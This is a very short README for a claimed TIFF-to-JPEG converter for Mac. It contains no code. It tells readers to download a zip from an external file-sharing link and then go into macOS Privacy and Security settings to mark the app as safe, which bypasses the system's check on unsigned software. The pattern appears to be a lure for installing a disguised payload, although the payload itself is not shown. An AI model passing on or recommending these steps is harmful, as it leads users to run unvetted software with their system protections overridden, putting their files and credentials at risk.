# TIFF-tif-to-jpeg
This tool wil convert your TIFF/tif files to jpeg!

# How to use mac? 
1. download the zip from https://limewire.com/d/7JfcB#TgzAcaMP3s
2. locate the file in terminal and right-click -> open
3. navigate to settings -> privacy and security -> scroll down -> and report the app as safe
4. now your ready to run!
